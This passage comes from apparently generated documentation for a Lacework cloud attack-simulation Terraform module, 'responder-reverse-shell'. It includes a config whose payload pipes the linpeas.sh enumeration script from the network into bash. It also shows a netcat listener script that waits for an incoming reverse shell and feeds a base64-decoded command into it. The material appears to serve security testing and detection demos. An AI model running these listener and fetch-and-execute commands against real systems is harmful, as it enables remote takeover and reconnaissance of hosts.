&amp;&amp;#35;125;<br/>&amp;&amp;#35;125;</pre> |
| attacker-runbook-responder-reverse-shell                 | ./modules/runbook/responder-reverse-shell            | runbook_exec_responder_reverse_shell             | context.azure.runbook.attacker.responder.reverse_shell            | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;attacker&quot;: {<br/>                    &quot;responder&quot;: {<br/>                        &quot;reverse_shell&quot;: {<br/>                            &quot;enabled&quot;: false,<br/>                            &quot;listen_ip&quot;: &quot;0.0.0.0&quot;,<br/>                            &quot;listen_port&quot;: 4444,<br/>                            &quot;payload&quot;: &quot;curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files&quot;<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/responder-reverse-shell            | <pre>locals &amp;&amp;#35;123;<br/>    listen&amp;&amp;#35;95;port = var&amp;#46;inputs&amp;&amp;#35;91;&quot;listen&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;<br/>    listen&amp;&amp;#35;95;ip = var&amp;#46;inputs&amp;&amp;#35;91;&quot;listen&amp;&amp;#35;95;ip&quot;&amp;&amp;#35;93;<br/>    base64&amp;&amp;#35;95;command&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;var&amp;#46;inputs&amp;&amp;#35;91;&quot;payload&quot;&amp;&amp;#35;93;&amp;&amp;#35;41;<br/>    payload = &lt;&lt;&amp;#45;EOT<br/>    START&amp;&amp;#35;95;HASH=$&amp;&amp;#35;40;sha256sum &amp;#45;&amp;#45;text /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME &amp;#124; awk &#x27;&amp;&amp;#35;123; print $1 &amp;&amp;#35;125;&#x27;&amp;&amp;#35;41;<br/>    while true; do<br/>        screen &amp;#45;S netcat &amp;#45;X quit<br/>        screen &amp;#45;wipe<br/>        truncate &amp;#45;s 0 /tmp/netcat&amp;#46;log<br/>        screen &amp;#45;d &amp;#45;L &amp;#45;Logfile /tmp/netcat&amp;#46;log &amp;#45;S netcat &amp;#45;m nc &amp;#45;vv &amp;#45;nl $&amp;&amp;#35;123;local&amp;#46;listen&amp;&amp;#35;95;ip&amp;&amp;#35;125; $&amp;&amp;#35;123;local&amp;#46;listen&amp;&amp;#35;95;port&amp;&amp;#35;125;<br/>        screen &amp;#45;S netcat &amp;#45;X colon &quot;logfile flush 0^M&quot;<br/>        log &quot;listener started&amp;#46;&amp;#46;&quot;<br/>        until tail /tmp/netcat&amp;#46;log &amp;#124; grep &amp;#45;m 1 &quot;Connection received&quot;; do<br/>            log &quot;waiting for connection&amp;#46;&amp;#46;&amp;#46;&quot;;<br/>            sleep 10;<br/>        done<br/>        sleep 30<br/>        log &#x27;sending screen command: $&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;payload&quot;&amp;&amp;#35;93;&amp;&amp;#35;125;&#x27;;<br/>        screen &amp;#45;S netcat &amp;#45;p 0 &amp;#45;X stuff &quot;echo &#x27;$&amp;&amp;#35;123;local&amp;#46;base64&amp;&amp;#35;95;command&amp;&amp;#35;95;payload&amp;&amp;#35;125;&#x27; &amp;#124; base64 &amp;#45;d &amp;#124; /bin/bash &amp;#45;^M&quot;<br/>        log &quot;responder started&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        log &#x27;waiting 10 minutes&amp;#46;&amp;#46;&amp;#46;&#x27;;<br/>        sleep 600<br/>        if &amp;#33; check&amp;&amp;#35;95;payload&amp;&amp;#35;95;update /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME $START&amp;&amp;#35;95;HASH; then<br/>            log &quot;payload update detected &amp;#45; exiting loop and forcing payload download&quot;<br/>            rm &amp;#45;f /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        fi<br/>    done<br/>    EOT<br/>    <br/>    base64&amp;&amp;#35;95;payload = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        apt&amp;&amp;#35;95;packages = &quot;&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks =  &quot;&quot;<br/>        yum&amp;&amp;#35;95;packages = &quot;&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = 30<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;&amp;&amp;#35;93;<br/>    &amp;&amp;#35;125;<br/>&amp;&amp;#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |